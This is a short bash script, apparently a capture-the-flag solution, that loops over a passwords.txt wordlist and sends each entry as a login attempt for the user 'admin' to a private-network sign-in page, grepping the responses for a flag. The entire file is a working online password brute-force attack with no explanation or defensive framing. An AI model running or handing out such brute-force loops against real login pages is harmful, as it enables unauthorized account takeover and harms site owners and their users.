#!/bin/bash

while read passwords
do
	curl "http://192.168.8.122/index.php?page=signin&username=admin&password=${passwords}&Login=Login#" | grep "flag"
	
done < passwords.txt

